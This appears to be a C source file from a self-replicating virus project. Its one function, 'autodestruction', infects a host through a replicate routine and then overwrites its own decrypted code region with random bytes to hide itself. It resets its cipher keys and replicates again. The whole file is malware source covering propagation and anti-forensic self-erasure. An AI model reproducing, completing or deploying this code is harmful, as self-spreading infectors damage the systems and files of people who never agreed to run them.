#include <war.h>

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void autodestruction(struct s_host *host, struct s_keychain *keychain, enum e_context context)
{
//	decrypt_left(keychain, (char *)injection, (void *)autodestruction - (void *)injection);

#if LOGGER
	MID_LOGGER("autodestruction:\t");
#endif

	replicate(host, keychain, context);

	char *entry;
	const size_t size = (void *)autodestruction - (void *)init;
	char buf[size];

	entry = (char *)init;

	if (_getrandom(buf, size, GRND_NONBLOCK) < 0)
		_bzero(buf, size);

	for (register size_t index = 0; index < size; index++)
		entry[index] = buf[index];

	keychain->key[LEFT] = 0xdead;
	keychain->key[RIGHT] = 0xbeef;

	replicate(host, keychain, context);
}
